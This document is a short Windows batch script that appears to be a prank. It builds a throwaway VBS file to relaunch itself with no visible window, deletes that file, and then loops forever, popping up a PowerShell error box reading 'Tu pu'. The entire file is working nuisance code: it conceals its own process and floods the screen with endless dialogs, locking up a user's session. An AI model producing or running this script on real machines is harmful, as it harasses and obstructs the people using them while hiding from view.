@echo off
:: Check if the script is already running in hidden mode
if "%1"=="hidden" goto hidden

:: Re-run the script using a hidden VBS script
echo Set WshShell = CreateObject("WScript.Shell") > temp.vbs
echo WshShell.Run """%~f0"" hidden", 0, False >> temp.vbs
cscript //nologo temp.vbs
del temp.vbs
exit

:hidden
:: Main loop that shows the error message
:loop
powershell -command "Add-Type -AssemblyName PresentationCore,PresentationFramework;[System.Windows.MessageBox]::Show('Tu pu', 'Error', 'OK', 'Error')"
goto loop

